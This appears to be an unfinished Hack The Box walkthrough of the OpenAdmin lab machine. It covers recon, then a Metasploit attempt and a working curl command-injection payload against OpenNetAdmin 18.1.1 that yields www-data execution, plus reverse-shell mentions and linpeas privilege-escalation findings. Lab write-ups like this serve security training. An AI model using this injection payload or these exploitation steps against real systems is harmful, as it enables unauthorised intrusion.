# [01 - OpenAdmin](https://app.hackthebox.com/machines/OpenAdmin)

  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
    * [80](#80)
    * [music](#music)
    * [ONA](#ONA)
  * [flag](#flag)
![OpenAdmin.png](OpenAdmin.png)

## description
> 10.10.10.171


## walkthrough

### recon

```
$ nmap -sC -sV -A -Pn -p- openadmin.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-08 16:53 MDT
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.059s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80

hrmm, as expected, it's the default page. going to start with gobuster

```
$ gobuster dir -u http://openadmin.htb -r -f -w ~/git/ctf/tools/wordlists/SecLists/Discovery/Web-Content/common.txt
...
/.hta/                (Status: 403) [Size: 278]
/.htaccess/           (Status: 403) [Size: 278]
/.htpasswd/           (Status: 403) [Size: 278]
/artwork/             (Status: 200) [Size: 14461]
/icons/               (Status: 403) [Size: 278]
/music/               (Status: 200) [Size: 12554]
/server-status/       (Status: 403) [Size: 278]
```

`artwork` and `music` up first


### music

> SOLMusic

has an option to create an account

going to `/category` gives us the ability to play some music, `/playlists` has.. some playlists

`/blog` has a blog.. and the name `Alan Smith`

`/contact` is a path to send some info, but it does not actually POST anything

clicking on 'login' takes us to `/ona` which has a lot going on.

> You are NOT on the latest release version
> Your version    = v18.1.1
> Latest version = Unable to determine
> Please DOWNLOAD the latest version

download is a link to [http://opennetadmin.com/download.html](http://opennetadmin.com/download.html)


additionally see
> Add a DNS domain
> Add a new subnet
> Add a new host
> Perform a search
> List hosts

and currently showing there is 1 DNS domain, which is `openadmin.htb`

looks like ONA does allow `guest` authentication.

and leaks some useful details for later:
```
Database Host	localhost
Database Type	mysqli
Database Name	ona_default
Database User	ona_sys
Database Context	DEFAULT
Database Context Desc	Default data context
```

### ONA

let's see what metasploit has to say
```
msf6 > search opennetadmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection

```

but

```
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOST openadmin.htb
RHOST => openadmin.htb
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.9:4444
[*] Exploiting...
[*] Command Stager progress - 100.00% done (703/703 bytes)
[*] Exploit completed, but no session was created.
```

which is strange, because
```
Description:
  This module exploits a command injection in OpenNetAdmin between
  8.5.14 and 18.1.1.
```

noticed this machine is running a little slow, so maybe we're timing out prematurely?

didn't find an easy way to control the timeout, so cooked up this curl:
> $ curl -v -X POST -H "Content-Type: application/x-www-form-urlencoded" http://openadmin.htb/ona/login.php --data-raw "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id;&xajaxargs[]=ping"

and while there was a lot of garbage to parse through, did see
```
<!-- Module Output -->
<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
    <tr>
        <td align="left" class="padding">
            <br>
            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">
                <pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
            </div>
        </td>
    </tr>
</table>
```

ok, to be more clear
```
<pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

so definitely got RCE, it's just ugly. let's make it pretty.

unfortunately, [rs.php](rs.php) gives an error we haven't seen before:
> WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111)


tried a couple other reverse shells, similar issues. ok, going to keep plugging along anyway.

linpeas:
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

...

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Sudoers file: /etc/sudoers.d/joanna is readable
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv

...


╔══════════╣ Users with console
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
root:x:0:0:root:/root:/bin/bash

...

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf
Listen 127.0.0.1:52846
<VirtualHost 127.0.0.1:52846>
  ServerName internal.openadmin.htb 
  DocumentRoot /var/www/internal
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf
<VirtualHost *:80>
        ServerName openadmin.htb
        ServerAdmin jimmy@openadmin.htb
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

...

╔══════════╣ Analyzing Github Files (limit 70)
drwxrwxr-x 8 www-data www-data 4096 Nov 22  2019 /var/www/html/marga/.git

...

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root     root     4096 Jan  4  2020 .
drwxr-xr-x 24 root     root     4096 Aug 17  2021 ..
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ona
-rw-r--r--  1 root     root        0 Nov 22  2019 priv

```

ok, that's a lot to take in.

## flag
```
user:
root:
```